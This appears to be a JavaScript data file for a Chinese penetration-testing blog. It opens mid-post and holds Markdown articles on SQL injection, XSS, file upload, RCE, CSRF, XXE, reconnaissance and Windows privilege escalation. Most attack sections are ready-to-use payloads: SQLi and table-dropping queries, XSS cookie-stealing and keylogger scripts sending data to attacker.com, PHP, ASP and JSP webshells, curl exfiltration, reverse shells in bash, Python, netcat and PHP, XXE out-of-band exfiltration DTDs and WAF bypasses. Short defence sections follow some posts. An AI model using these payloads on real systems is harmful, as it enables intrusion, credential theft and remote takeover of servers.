#### 联合查询注入（UNION）
\`\`\`sql
-- 1. 判断字段数
?id=1' ORDER BY 5--
?id=1' ORDER BY 3--  -- 报错，说明有3个字段

-- 2. 确定回显位置
?id=1' UNION SELECT 1,2,3--

-- 3. 获取数据
?id=1' UNION SELECT 1,database(),3--
?id=1' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()--
?id=1' UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='users'--
?id=1' UNION SELECT 1,GROUP_CONCAT(username,0x3a,password),3 FROM users--
\`\`\`

#### 报错注入（Error-based）
\`\`\`sql
-- extractvalue
?id=1' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--

-- updatexml
?id=1' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--

-- floor
?id=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
\`\`\`

#### 布尔盲注（Boolean-based）
\`\`\`sql
-- 判断数据库名长度
?id=1' AND LENGTH(database())>5--  -- 正常返回
?id=1' AND LENGTH(database())>10-- -- 错误返回

-- 逐字符判断数据库名
?id=1' AND ASCII(SUBSTR(database(),1,1))>100--
?id=1' AND ASCII(SUBSTR(database(),1,1))>110--
\`\`\`

#### 时间盲注（Time-based）
\`\`\`sql
-- MySQL
?id=1' AND IF(LENGTH(database())>5,SLEEP(3),0)--

-- PostgreSQL
?id=1'; SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END--

-- SQL Server
?id=1'; IF (1=1) WAITFOR DELAY '0:0:3'--
\`\`\`

#### 堆叠注入（Stacked Queries）
\`\`\`sql
?id=1'; DROP TABLE users;--
?id=1'; INSERT INTO users VALUES('hacker','123456');--
\`\`\`

## 常见检测语句

\`\`\`
' OR 1=1 --
' OR '1'='1
" OR "1"="1
' UNION SELECT 1,2,3 --
1' AND SLEEP(5) --
\`\`\`

## 利用流程

1. **判断注入点**：添加单引号、逻辑条件
2. **判断注入类型**：数字型/字符型
3. **判断字段数**：ORDER BY N
4. **确定回显位置**：UNION SELECT 1,2,3...
5. **获取数据库信息**：database(), version(), user()
6. **获取表名**：information_schema.tables
7. **获取字段名**：information_schema.columns
8. **获取数据**：查询目标表内容

## 数据库特性

### MySQL
\`\`\`sql
-- 版本
SELECT version()
-- 数据库
SELECT database()
-- 用户
SELECT user()
\`\`\`

### SQL Server
\`\`\`sql
-- 版本
SELECT @@version
-- 数据库
SELECT DB_NAME()
-- 用户
SELECT SYSTEM_USER
\`\`\`

### Oracle
\`\`\`sql
-- 版本
SELECT banner FROM v$version WHERE ROWNUM=1
-- 表名
SELECT table_name FROM all_tables WHERE rownum=1
\`\`\`

## SQLmap 使用

\`\`\`bash
# 基本使用
sqlmap -u "http://target/?id=1" --dbs

# POST 注入
sqlmap -u "http://target/login" --data="user=admin&pass=123" --dbs

# 带 Cookie
sqlmap -u "http://target/?id=1" --cookie="session=xxx" --dbs

# 从 Burp 导出的请求文件
sqlmap -r request.txt --dbs

# 指定数据库和表
sqlmap -u "http://target/?id=1" -D mydb -T users --dump

# 执行系统命令
sqlmap -u "http://target/?id=1" --os-shell

# 读取文件
sqlmap -u "http://target/?id=1" --file-read="/etc/passwd"

# 绕过 WAF
sqlmap -u "http://target/?id=1" --tamper=space2comment,between --random-agent
\`\`\`

## WAF 绕过技巧

- **注释符绕过**：\`/**/\` 替代空格
- **大小写混合**：\`SeLeCt\`
- **双写绕过**：\`selselectect\`
- **编码绕过**：URL编码、Unicode编码
- **等号替换**：\`LIKE\`、\`REGEXP\`、\`BETWEEN\`
- **逗号替换**：\`JOIN\`、\`LIMIT 1 OFFSET 1\`

## 防御方案

1. **参数化查询**（Prepared Statements）
\`\`\`python
# Python 示例
cursor.execute("SELECT * FROM users WHERE username=%s", (username,))
\`\`\`

2. **存储过程**
3. **输入验证和白名单过滤**
4. **最小权限原则**：应用数据库用户只给必要权限
5. **WAF 防护**
6. **错误信息隐藏**
    `
  },
  {
    slug: 'xss-attack',
    title: 'XSS 跨站脚本攻击完全指南',
    date: '2026-06-12',
    category: 'websec',
    subcategory: 'xss',
    tags: ['Web安全', 'XSS', '前端安全'],
    summary: 'XSS 攻击类型、Payload 构造、绕过技巧和防御措施。',
    content: `
## 什么是 XSS

XSS（Cross-Site Scripting）跨站脚本攻击，攻击者在网页中注入恶意脚本，当用户浏览时执行，窃取 Cookie、会话令牌等敏感信息。

## XSS 类型

### 反射型 XSS
恶意脚本通过 URL 参数传入，服务器直接返回给用户。

\`\`\`
http://target/search?q=<script>alert(document.cookie)</script>
\`\`\`

**特点**：需要用户点击恶意链接，非持久化。

### 存储型 XSS
恶意脚本存储在服务器数据库中，所有访问该页面的用户都会受影响。

**典型场景**：留言板、评论区、用户资料。

**特点**：持久化，危害更大。

### DOM 型 XSS
前端 JavaScript 直接操作 DOM 导致的漏洞，不经过服务器。

\`\`\`javascript
// 漏洞代码
var name = location.hash.substring(1);
document.getElementById("output").innerHTML = "Hello, " + name;
\`\`\`

**攻击**：\`http://target/#<img src=x onerror=alert(1)>\`

## 常见 Payload

### 基础测试
\`\`\`html
<script>alert(1)</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>
\`\`\`

### 标签绕过
\`\`\`html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<details open ontoggle=alert(1)>
<video src=x onerror=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
\`\`\`

### 事件处理器
\`\`\`html
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>
<video><source onerror=alert(1)>
<object data="javascript:alert(1)">
\`\`\`

### 无括号执行
\`\`\`javascript
// 使用反引号
\`alert\`1\`\`

// 使用 SVG
<svg><script>alert&#40;1&#41;</script></svg>

// 使用 eval
<img src=x onerror="eval(atob('YWxlcnQoMSk='))">
\`\`\`

### 窃取 Cookie
\`\`\`javascript
<script>
new Image().src="http://attacker.com/steal?c="+document.cookie;
</script>

<img src=x onerror="fetch('http://attacker.com/steal?c='+document.cookie)">
\`\`\`

### Keylogger
\`\`\`javascript
<script>
document.onkeypress=function(e){
  fetch('http://attacker.com/log?k='+e.key)
}
</script>
\`\`\`

## 绕过技巧

### 大小写混合
\`\`\`html
<ScRiPt>alert(1)</sCrIpT>
\`\`\`

### 双写绕过
\`\`\`html
<scrscriptipt>alert(1)</scrscriptipt>
\`\`\`

### 编码绕过
\`\`\`html
&#60;script&#62;alert(1)&#60;/script&#62;
\x3cscript\x3ealert(1)\x3c/script\x3e
%3Cscript%3Ealert(1)%3C/script%3E
\`\`\`

### 空格绕过
\`\`\`html
<script/**/>alert(1)</script/>
<img/src=x onerror=alert(1)>
\`\`\`

### CSP 绕过
\`\`\`html
// 利用 JSONP 端点
<script src="https://target.com/jsonp?callback=alert(1)//">

// 利用 CDN
<script src="https://cdn.jsdelivr.net/npm/evil.js">
\`\`\`

## 工具

- **XSStrike**：自动化 XSS 检测
- **DalFox**：参数分析和漏洞扫描
- **kxss**：反射型 XSS 检测
- **Polyglot**：万能 Payload

\`\`\`bash
# XSStrike
python xsstrike.py -u "http://target/search?q=test"

# DalFox
dalfox url "http://target/search?q=test" --blind your-server.com
\`\`\`

## 防御方案

1. **HTML 实体编码**：\`<\` → \`&lt;\`，\`>\` → \`&gt;\`
2. **CSP（Content Security Policy）**
\`\`\`
Content-Security-Policy: default-src 'self'; script-src 'self'
\`\`\`

3. **HttpOnly Cookie**：防止 JavaScript 读取
4. **输入验证**：白名单过滤
5. **输出编码**：根据上下文选择编码方式
6. **X-XSS-Protection**：浏览器 XSS 过滤器
    `
  },
  {
    slug: 'file-upload',
    title: '文件上传漏洞利用与防御',
    date: '2026-06-14',
    category: 'websec',
    subcategory: 'upload',
    tags: ['Web安全', '文件上传', '渗透测试'],
    summary: '文件上传漏洞的检测、绕过技巧和防御方案。',
    content: `
## 什么是文件上传漏洞

文件上传漏洞是指 Web 应用允许用户上传文件但未对文件类型、内容进行严格校验，导致攻击者可以上传恶意文件（如 Webshell）获取服务器控制权。

## 危害

- 上传 Webshell 获取服务器权限
- 上传恶意文件执行命令
- 上传钓鱼文件
- 服务器被控制为跳板

## 漏洞类型

### 1. 前端校验绕过
前端 JavaScript 验证文件扩展名，可直接 Burp 抓包修改。

### 2. MIME 类型校验
仅检查 Content-Type 字段，可直接修改：
\`\`\`http
Content-Type: image/png
\`\`\`

### 3. 黑名单校验
过滤特定扩展名，可使用大小写、双写、特殊后缀绕过。

### 4. 白名单校验
仅允许特定扩展名，可利用解析漏洞。

### 5. 目录路径可控
可修改上传路径：\`filename="../../../shell.php"\`

## 绕过技巧

### 扩展名绕过
\`\`\`
php → php3, php4, php5, php7, phtml, pht, phps
asp → aspx, cfm, cer
jsp → jspf,jspx
\`\`\`

### 大小写绕过
\`\`\`
.php → .PhP, .PHP, .pHp
\`\`\`

### 双写绕过
\`\`\`
.php → .pphphp
\`\`\`

### 空字节绕过（%00 截断）
\`\`\`
shell.php%00.jpg  -- PHP 5.3.4 以下
shell.php\x00.jpg
\`\`\`

### .htaccess 绕过
上传 .htaccess 文件：
\`\`\`apache
AddType application/x-httpd-php .jpg
\`\`\`
之后上传 .jpg 文件即可当作 PHP 执行。

### .user.ini 绕过
上传 .user.ini 文件：
\`\`\`ini
auto_prepend_file=shell.jpg
\`\`\`
在同目录下所有 PHP 文件前包含 shell.jpg。

### 图片马
将 PHP 代码嵌入图片文件：
\`\`\`bash
copy /b normal.jpg + shell.php shell.jpg
\`\`\`

### 文件头绕过
在文件开头添加图片文件头：
\`\`\`
GIF89a <?php eval($_POST['cmd']); ?>
\`\`\`

## 解析漏洞

### IIS 解析漏洞
\`\`\`
/test.asp/test.jpg    -- IIS 6.0
/test.asp:.jpg        -- IIS 6.0
/test.cer             -- IIS 6.0
/test.asp;/test.jpg   -- IIS 6.0
\`\`\`

### Nginx 解析漏洞
\`\`\`
/test.jpg/.php        -- 配置不当
/test.jpg%00.php      -- 空字节
\`\`\`

### Apache 解析漏洞
\`\`\`
test.php.xxx          -- 不识别的后缀名
\`\`\`

## 一句话木马

### PHP
\`\`\`php
<?php eval($_POST['cmd']); ?>
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
\`\`\`

### ASP
\`\`\`asp
<%eval request("cmd")%>
\`\`\`

### JSP
\`\`\`jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
\`\`\`

## Webshell 管理工具

- **中国蚁剑（AntSword）**
- **哥斯拉（Godzilla）**
- **冰蝎（Behinder）**
- **冰蛇（Behinder v3）**

\`\`\`bash
# 连接一句话
蚁剑 → 添加数据 → 填写 URL 和密码
\`\`\`

## 防御方案

1. **白名单校验**：只允许特定扩展名
2. **重命名文件**：随机文件名
3. **文件内容检测**：检查文件头
4. **上传目录隔离**：Web 目录外存储
5. **禁用脚本执行**：上传目录不解析 PHP
6. **文件大小限制**
7. **使用 CDN/WAF**
    `
  },
  {
    slug: 'rce-vulnerability',
    title: '命令执行漏洞（RCE）',
    date: '2026-06-13',
    category: 'websec',
    subcategory: 'rce',
    tags: ['Web安全', 'RCE', '命令执行', '渗透测试'],
    summary: '远程代码执行和远程命令执行漏洞的原理与利用。',
    content: `
## 什么是 RCE

RCE（Remote Code Execution）远程代码执行，攻击者可以在目标服务器上执行任意命令或代码。

## 漏洞分类

### 远程命令执行（RCE）
直接执行系统命令，如 \`ping\`、\`ls\`、\`cat\`。

### 远程代码执行（Code Exec）
执行编程语言代码，如 PHP、Python、Java。

## 常见触发函数

### PHP
\`\`\`php
system()        -- 执行系统命令
exec()          -- 执行命令并返回最后一行
passthru()      -- 直接显示输出
shell_exec()    -- 执行命令并返回字符串
popen()         -- 打开进程
proc_open()     -- 执行命令并控制输入输出
eval()          -- 执行 PHP 代码
assert()        -- 执行 PHP 代码
\`\`\`

### Python
\`\`\`python
os.system()
os.popen()
subprocess.call()
subprocess.Popen()
eval()
exec()
\`\`\`

### Java
\`\`\`java
Runtime.getRuntime().exec()
ProcessBuilder
\`\`\`

## 命令执行漏洞

### 直接注入
\`\`\`
http://target/ping.php?ip=127.0.0.1;whoami
http://target/ping.php?ip=127.0.0.1|whoami
http://target/ping.php?ip=127.0.0.1||whoami
http://target/ping.php?ip=127.0.0.1&&whoami
\`\`\`

### 绕过空格过滤
\`\`\`
{cat,/etc/passwd}
cat$IFS/etc/passwd
cat\t/etc/passwd
cat<> /etc/passwd
\`\`\`

### 绕过关键字过滤
\`\`\`bash
# 绕过 cat
tac /etc/passwd
more /etc/passwd
less /etc/passwd
head /etc/passwd
tail /etc/passwd
nl /etc/passwd
od -c /etc/passwd
xxd /etc/passwd
sort /etc/passwd
uniq /etc/passwd
rev /etc/passwd

# 绕过 flag
f\\lag
fla[g]
cat /etc/pas*wd
cat /etc/pas?wd
\`\`\`

### 无回显利用
\`\`\`bash
# 写入文件
echo PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTsgPz4= | base64 -d > shell.php

# 外带数据
cat /etc/passwd | curl http://attacker.com/$(cat /etc/passwd | base64)

# 反弹 Shell
bash -i >& /dev/tcp/attacker.com/4444 0>&1
\`\`\`

## 代码执行漏洞

### PHP eval
\`\`\`php
// 漏洞代码
<?php eval($_GET['code']); ?>

// 利用
?code=system('whoami');
?code=phpinfo();
\`\`\`

### Python exec
\`\`\`python
# 漏洞代码
exec(request.args.get('code'))

# 利用
?code=__import__('os').popen('whoami').read()
\`\`\`

## 常见场景

### CTF 题目
\`\`\`
- ping 命令注入
- 日志分析注入
- 代码审计找 eval
- Python 沙箱逃逸
\`\`\`

### 实际漏洞
\`\`\`
- Weblogic 反序列化
- Struts2 OGNL 注入
- Apache Shiro 反序列化
- Log4j2 JNDI 注入
\`\`\`

## 反弹 Shell

### Bash
\`\`\`bash
bash -i >& /dev/tcp/attacker.com/4444 0>&1
\`\`\`

### Python
\`\`\`python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
\`\`\`

### Netcat
\`\`\`bash
nc -e /bin/sh attacker.com 4444
\`\`\`

### PHP
\`\`\`php
<?php
$sock=fsockopen("attacker.com",4444);
exec("/bin/sh -i <&3 >&3 2>&3");
?>
\`\`\`

## 防御方案

1. **输入验证**：白名单过滤
2. **避免使用危险函数**
3. **使用参数化接口**
4. **最小权限原则**
5. **禁用危险 PHP 函数**
\`\`\`ini
; php.ini
disable_functions = system,exec,shell_exec,passthru,popen,proc_open
\`\`\`

6. **WAF 规则**
    `
  },
  {
    slug: 'csrf-attack',
    title: 'CSRF 请求伪造攻击',
    date: '2026-06-11',
    category: 'websec',
    subcategory: 'csrf',
    tags: ['Web安全', 'CSRF', '请求伪造'],
    summary: 'CSRF 攻击原理、利用方式和防御方案。',
    content: `
## 什么是 CSRF

CSRF（Cross-Site Request Forgery）跨站请求伪造，攻击者诱导用户在已登录的状态下访问恶意页面，浏览器自动携带用户凭证发送伪造请求。

## 攻击原理

1. 用户登录目标网站，获得 Session/Cookie
2. 用户访问攻击者控制的页面
3. 恶意页面向目标网站发送请求
4. 浏览器自动携带用户 Cookie
5. 目标网站认为是用户本人操作

## 攻击方式

### GET 型 CSRF
\`\`\`html
<!-- 修改用户密码 -->
<img src="http://target.com/change_password?new=hacked">

<!-- 转账 -->
<img src="http://target.com/transfer?to=attacker&amount=10000">
\`\`\`

### POST 型 CSRF
\`\`\`html
<form action="http://target.com/change_password" method="POST">
  <input type="hidden" name="new_password" value="hacked">
</form>
<script>document.forms[0].submit()</script>
\`\`\`

### Flash CSRF
\`\`\`html
<object type="application/x-shockwave-flash" 
  data=".swf">
  <param name="movie" value="http://attacker.com/csrf.swf">
</object>
\`\`\`

## 利用场景

### 修改个人信息
\`\`\`html
<form action="http://target.com/profile/update" method="POST">
  <input name="email" value="hacker@evil.com">
</form>
\`\`\`

### 发送邮件/消息
\`\`\`html
<form action="http://target.com/api/send" method="POST">
  <input name="to" value="victim@target.com">
  <input name="content" value="点击链接领奖">
</form>
\`\`\`

### 删除操作
\`\`\`html
<img src="http://target.com/api/delete?id=123">
\`\`\`

## CSRF 与 XSS 的区别

| 特性 | XSS | CSRF |
|------|-----|------|
| 攻击目标 | 用户浏览器 | Web 应用 |
| 利用方式 | 注入恶意脚本 | 伪造用户请求 |
| 是否需要登录 | 不需要 | 需要 |
| 危害 | 窃取数据 | 执行操作 |
| 防御重点 | 输入过滤 | Token 验证 |

## 防御方案

### 1. CSRF Token
\`\`\`html
<!-- 表单中添加 Token -->
<form action="http://target.com/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="随机Token">
  <input name="amount" value="100">
</form>
\`\`\`

### 2. SameSite Cookie
\`\`\`
Set-Cookie: session=xxx; SameSite=Strict
Set-Cookie: session=xxx; SameSite=Lax
\`\`\`

### 3. 验证 Referer/Origin
\`\`\`python
if request.headers.get('Referer') != 'http://target.com':
    return 'Forbidden'
\`\`\`

### 4. 验证 Content-Type
\`\`\`python
if request.content_type != 'application/json':
    return 'Forbidden'
\`\`\`

### 5. 自定义请求头
\`\`\`javascript
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': token,
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({amount: 100})
})
\`\`\`

### 6. 二次验证
重要操作（如转账）要求输入密码确认。
    `
  },
  {
    slug: 'xxe-injection',
    title: 'XXE 注入漏洞详解',
    date: '2026-06-09',
    category: 'websec',
    subcategory: 'xxe',
    tags: ['Web安全', 'XXE', 'XML注入'],
    summary: 'XXE 漏洞原理、利用方式和防御方案。',
    content: `
## 什么是 XXE

XXE（XML External Entity）XML 外部实体注入，当应用解析用户提供的 XML 数据时，未禁用外部实体，导致攻击者可以读取文件、执行命令、发起 SSRF。

## XML 基础

### DTD（文档类型定义）
\`\`\`xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>&xxe;</user>
\`\`\`

### 实体类型
- **内部实体**：\`<!ENTITY xxe "value">\`
- **外部实体**：\`<!ENTITY xxe SYSTEM "url">\`
- **参数实体**：\`<!ENTITY % xxe SYSTEM "url">\`

## 漏洞类型

### 1. 读取本地文件
\`\`\`xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>&xxe;</user>
\`\`\`

### 2. 读取 Windows 文件
\`\`\`xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
\`\`\`

### 3. SSRF 攻击
\`\`\`xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
\`\`\`

### 4. 带外数据回显（OOB）
\`\`\`xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
\`\`\`

evil.dtd：
\`\`\`xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % param "<!ENTITY exfil SYSTEM 'http://attacker.com/?data=%data;'>">
%param;
\`\`\`

### 5. 参数实体注入
\`\`\`xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexist/%file;'>">
  %eval;
  %error;
]>
\`\`\`

## 检测方法

### 判断是否存在 XXE
\`\`\`xml
<!-- 方法1：盲注 -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://attacker.com/xxe-test">
]>
<user>&xxe;</user>

<!-- 方法2：错误触发 -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///nonexistent">
]>
<user>&xxe;</user>
\`\`\`

### 使用工具
\`\`\`bash
# XXEinjector
ruby XXEinjector.rb --host=attacker.com --file=request.txt
\`\`\`

## 常见应用场景

### 文件上传（SVG）
\`\`\`xml
<!-- 上传恶意 SVG 文件 -->
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="20">
    <script>
      document.location='http://attacker.com/?c='+document.cookie;
    </script>
  </text>
</svg>
\`\`\`

### SOAP 接口
\`\`\`xml
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <user>&xxe;</user>
  </soap:Body>
</soap:Envelope>
\`\`\`

### PDF 生成
某些 PDF 生成库（如 wkhtmltopdf）会解析 HTML 中的 XML 实体。

## 绕过技巧

### 字符编码
\`\`\`xml
<!-- UTF-7 -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>

<!-- 十六进制编码 -->
<!ENTITY xxe SYSTEM "hex:2f6574632f706173737764">
\`\`\`

### 协议限制
\`\`\`xml
<!-- 尝试不同协议 -->
file:///etc/passwd
http://127.0.0.1/
ftp://127.0.0.1/
gopher://127.0.0.1/
\`\`\`

## 防御方案

1. **禁用外部实体**
\`\`\`python
# Python
import xml.etree.ElementTree as ET
# 默认已禁用

# Java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
\`\`\`

2. **输入验证**：过滤 XML 数据
3. **使用 JSON 替代 XML**
4. **WAF 规则**：过滤 \`SYSTEM\`、\`PUBLIC\` 关键字
5. **最小权限**：Web 服务器进程不读取敏感文件
    `
  },
  // 攻防对抗
  {
    slug: 'recon-methods',
    title: '信息收集方法论',
    date: '2026-06-10',
    category: 'attack-defense',
    subcategory: 'recon',
    tags: ['渗透测试', '信息收集', ' reconnaissance'],
    summary: '渗透测试信息收集阶段的完整方法和工具。',
    content: `
## 信息收集分类

### 被动信息收集
- **WHOIS 查询**
- **子域名枚举**：subfinder, amass, oneforAll
- **DNS 记录查询**：dig, nslookup
- **搜索引擎**：Google Hacking, Shodan, FOFA
- **证书透明度**：crt.sh

### 主动信息收集
- **端口扫描**：Nmap, Masscan
- **服务识别**
- **操作系统探测**
- **漏洞扫描**：Nuclei, Xray

## 常用工具

\`\`\`bash
# 子域名枚举
subfinder -d target.com -o subdomains.txt

# Nmap 扫描
nmap -sV -sC -p- target.com

# 目录扫描
dirsearch -u http://target.com/

# 漏洞扫描
nuclei -u http://target.com/ -t cves/
\`\`\`

## Google Hacking

\`\`\`
site:target.com filetype:php
intitle:"index of" "parent directory"
inurl:admin login
\`\`\`
    `
  },
  {
    slug: 'windows-privesc',
    title: 'Windows 权限提升',
    date: '2026-06-08',
    category: 'attack-defense',
    subcategory: 'privesc',
    tags: ['渗透测试', '权限提升', 'Windows'],
    summary: 'Windows 环境下的常见提权方法和工具。',
    content: `
## 提权方法

### 1. 系统漏洞提权
\`\`\`powershell
# 查看系统补丁
systeminfo | findstr KB

# 使用 watson/WinPEAS 检查可利用漏洞
\`\`\`

### 2. 服务配置提权
\`\`\`powershell
# 查找可写路径的服务
sc qc <service_name>
icacls "C:\\path\\to\\service.exe"
\`\`\`

### 3. 计划任务提权
\`\`\`powershell
# 列出计划任务
schtasks /query /fo LIST /v

# 查找可修改的计划任务
\`\`\`

### 4. AlwaysInstallElevated
\`\`\`powershell
# 检查注册表
reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
\`\`\`

### 5. Token 模拟
\`\`\`powershell
# potato 系列
JuicyPotato.exe -l 1337 -p cmd.exe -a "/c whoami" -t *
\`\`\`

## 工具
- WinPEAS
- PowerUp
- SharpUp
- Seatbelt
    `
  },
  // 工具手册
  {
    slug: 'nmap-guide',
    title: 'Nmap 使用指南',
    date: '2026-06-05',
    category: 'tools',
    subcategory: 'nmap',
    tags: ['工具', 'Nmap', '扫描'],
    summary: 'Nmap 端口扫描工具的完整使用指南。',
    content: `
## 基本用法

\`\`\`bash
# 快速扫描
nmap target.com

# 全端口扫描
nmap -p- target.com

# 服务版本检测
nmap -sV target.com

# 操作系统探测
nmap -O target.com

# 使用脚本
nmap --script vuln target.com
\`\`\`

## 常用参数

| 参数 | 说明 |
|------|------|
| -sS | TCP SYN 扫描 |
| -sT | TCP 连接扫描 |
| -sU | UDP 扫描 |
| -sV | 版本检测 |
| -O | 操作系统探测 |
| -A | 全面扫描 |
| -p | 指定端口 |
| -T4 | 速度模板 |
| --script | 使用脚本 |

## 输出格式

\`\`\`bash
nmap -oN output.txt target.com
nmap -oX output.xml target.com
nmap -oG output.gnmap target.com
\`\`\`
    `
  },
  {
    slug: 'burpsuite-guide',
    title: 'BurpSuite 使用指南',
    date: '2026-06-01',
    category: 'tools',
    subcategory: 'burpsuite',
    tags: ['工具', 'BurpSuite', '抓包'],
    summary: 'BurpSuite 抓包工具的核心模块和使用技巧。',
    content: `
## 核心模块

### Proxy（代理）
- 拦截 HTTP/HTTPS 请求
- 修改请求/响应内容
- 历史记录查看

### Intruder（入侵者）
- 自动化参数爆破
- 支持多种攻击模式：
  - Sniper：逐个参数
  - Battering ram：相同值
  - Pitchfork：多组对应值
  - Cluster bomb：全组合

### Repeater（重放器）
- 手动修改并重发请求
- 测试漏洞 Payload

### Decoder（解码器）
- URL/Base64/Hex 等编码解码

## 常用技巧

1. **抓包改包**：Proxy → Intercept
2. **爆破密码**：Intruder → Positions/Payloads
3. **测试漏洞**：Repeater → 修改参数
4. **绕过 WAF**：修改 Headers、编码 Payload
    `
  },
  // 应急响应
  {
    slug: 'ir-process',
    title: '应急响应事件处理流程',
    date: '2026-05-28',
    category: 'ir',
    subcategory: 'ir-process',
    tags: ['应急响应', '安全运营', '事件处理'],
    summary: '安全事件应急响应的标准处理流程。',
    content: `
## 应急响应流程

### 1. 准备阶段
- 建立应急响应团队
- 准备工具和环境
- 制定响应预案

### 2. 检测阶段
- 确认安全事件
- 评估影响范围
- 事件分级分类

### 3. 抑制阶段
- 隔离受影响系统
- 阻断攻击路径
- 保存证据

### 4. 根除阶段
- 分析攻击手法
- 清除恶意程序
- 修复漏洞

### 5. 恢复阶段
- 恢复系统服务
- 验证系统安全
- 监控异常行为

### 6. 总结阶段
- 编写事件报告
- 复盘改进措施
- 更新安全策略

## 常用工具

- **流量分析**：Wireshark, tcpdump
- **日志分析**：ELK, Splunk
- **恶意文件**：VirusTotal, 微步在线
- **系统排查**：Autoruns, Process Explorer
    `
  },
  // 域渗透
  {
    slug: 'domain-environment',
    title: '域环境基础知识',
    date: '2026-05-25',
    category: 'domain',
    subcategory: 'domain-basic',
    tags: ['域渗透', 'Active Directory', 'Windows'],
    summary: 'Windows 域环境的基本概念和架构。',
    content: `
## 域的基本概念

### 什么是域
域是 Windows 网络中共享统一目录数据库的计算机集合。

### 域控制器（DC）
- 存储 Active Directory 数据库
- 处理身份验证
- 管理域内资源

### 域内常见组
- **Domain Admins** - 域管理员
- **Enterprise Admins** - 企业管理员
- **Domain Users** - 域用户
- **Domain Controllers** - 域控制器

## 常用协议

| 协议 | 用途 |
|------|------|
| LDAP | 目录访问 |
| Kerberos | 身份认证 |
| NTLM | 身份认证 |
| SMB | 文件共享 |
| RPC | 远程调用 |

## 域内信息收集

\`\`\`powershell
# 查看当前域
net config workstation

# 查看域用户
net user /domain

# 查看域组
net group /domain

# 查看域控
nltest /dclist:domain.com

# DNS 记录
nslookup -type=SRV _ldap._tcp.dc._msdcs.domain.com
\`\`\`
    `
  },
]

export function getAllPosts() {
  return posts.sort((a, b) => new Date(b.date) - new Date(a.date))
}

export function getPostBySlug(slug) {
  return posts.find(p => p.slug === slug)
}

export function getPostsByCategory(categoryId) {
  return posts.filter(p => p.category === categoryId)
}

export function getPostsBySubcategory(subcategoryId) {
  return posts.filter(p => p.subcategory === subcategoryId)
}

export function getAllTags() {
  const tags = new Set()
  posts.forEach(p => p.tags.forEach(t => tags.add(t)))
  return Array.from(tags)
}

export function getPostsByTag(tag) {
  return posts.filter(p => p.tags.includes(tag))
}

export function searchPosts(query) {
  const lower = query.toLowerCase()
  return posts.filter(p =>
    p.title.toLowerCase().includes(lower) ||
    p.summary.toLowerCase().includes(lower) ||
    p.content.toLowerCase().includes(lower)
  )
}

export function getCategoryById(id) {
  for (const cat of categories) {
    if (cat.id === id) return cat
    const sub = cat.children?.find(c => c.id === id)
    if (sub) return { ...sub, parent: cat }
  }
  return null
}
